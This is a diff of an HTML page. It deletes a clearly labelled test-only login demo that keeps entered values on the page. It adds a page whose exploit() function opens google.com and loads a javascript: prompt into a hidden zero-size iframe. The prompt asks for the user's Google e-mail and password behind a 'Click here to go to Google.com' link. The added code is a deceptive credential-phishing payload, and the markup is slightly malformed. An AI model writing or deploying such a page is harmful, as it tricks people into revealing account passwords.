@@ -1,102 +1,25 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <title>SAFE Login Demo (TEST ONLY)</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    /* Simple modal style */
-    body { font-family: system-ui, Arial; margin:0; background:#f5f7fa; color:#111 }
-    .container { max-width:720px; margin:3rem auto; padding:1rem; }
-    .warning {
-      background:#ffe9e9; border:1px solid #ffb3b3; color:#700;
-      padding:12px; border-radius:8px; margin-bottom:1rem;
+v<html>
+  <body>
+
+    <script>
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+    
     }
-    .btn { display:inline-block; padding:10px 16px; border-radius:8px; cursor:pointer; border: none; background:#1a73e8; color:white; }
-    .btn:active{transform:translateY(1px)}
-    /* Modal */
-    .modal-backdrop { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.45); }
-    .modal { background:white; width:360px; border-radius:10px; padding:18px; box-shadow:0 6px 24px rgba(0,0,0,0.2); }
-    .modal h2 { margin:0 0 8px; font-size:18px }
-    .field { margin:10px 0; }
-    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
-    .small { font-size:12px; color:#555 }
-    .result { margin-top:12px; background:#eef7ff; border:1px solid #cfe7ff; padding:8px; border-radius:6px; font-family:monospace; white-space:pre-wrap; }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="warning">
-      <strong>SAFE DEMO — FOR TESTING ONLY</strong><br>
-      Do NOT enter real credentials. This page will <em>not</em> send data anywhere. Use only test accounts in an isolated environment.
-    </div>
+    
+    </script>
 
-    <p>Click the button below to open a <strong>local test login modal</strong>. This demonstrates a login UI for research/testing without using <code>javascript:</code> URIs, <code>about:blank</code> tricks, or collecting data.</p>
+    <br><br><br><br>
 
-    <button class="btn" id="open">Open Login Modal (TEST)</button>
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
 
-    <div id="log" class="result" style="display:none"></div>
-  </div>
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
 
-  <template id="modalTpl">
-    <div class="modal-backdrop" role="dialog" aria-modal="true">
-      <div class="modal" role="document">
-        <h2>TEST Login (DO NOT USE REAL CREDENTIALS)</h2>
-        <div class="small">This is a harmless demo. Nothing will be sent to a server.</div>
-
-        <div class="field">
-          <label class="small">Email or username</label>
-          <input id="demoEmail" type="text" autocomplete="off" />
-        </div>
-        <div class="field">
-          <label class="small">Password</label>
-          <input id="demoPass" type="password" autocomplete="new-password" />
-        </div>
-
-        <div style="display:flex; gap:8px; margin-top:12px;">
-          <button id="submitBtn" class="btn">Submit (TEST)</button>
-          <button id="closeBtn" class="btn" style="background:#6c757d">Close</button>
-        </div>
-
-        <p class="small" style="margin-top:10px; color:#666">
-          Purpose: test UI/behavior only. For real-security testing use controlled lab, test accounts, and obtain permission.
-        </p>
-      </div>
-    </div>
-  </template>
-
-  <script>
-    // Open modal and wire up handlers
-    document.getElementById('open').addEventListener('click', function () {
-      const tpl = document.getElementById('modalTpl');
-      const node = tpl.content.cloneNode(true);
-      const backdrop = node.querySelector('.modal-backdrop');
-
-      // Attach handlers
-      backdrop.querySelector('#closeBtn').addEventListener('click', () => {
-        backdrop.remove();
-      });
-
-      backdrop.querySelector('#submitBtn').addEventListener('click', () => {
-        const email = backdrop.querySelector('#demoEmail').value;
-        const pass  = backdrop.querySelector('#demoPass').value;
-
-        // IMPORTANT: do NOT send anywhere. This is for demonstration only.
-        // Log to console and display on page to simulate capture for local testing.
-        console.log('[TEST DEMO] captured values (DO NOT USE REAL CREDENTIALS):', {email, pass});
-        const logEl = document.getElementById('log');
-        logEl.style.display = 'block';
-        logEl.textContent = 'Captured (TEST ONLY):\\n' + 
-                            'email: ' + email + '\\n' +
-                            'password: ' + pass + '\\n\\n' +
-                            'Reminder: this demo does not transmit data.';
-        // Clear fields so tester doesn't accidentally reuse
-        backdrop.querySelector('#demoEmail').value = '';
-        backdrop.querySelector('#demoPass').value = '';
-      });
-
-      document.body.appendChild(node);
-    });
-  </script>
-</body>
+  </body>
 </html>
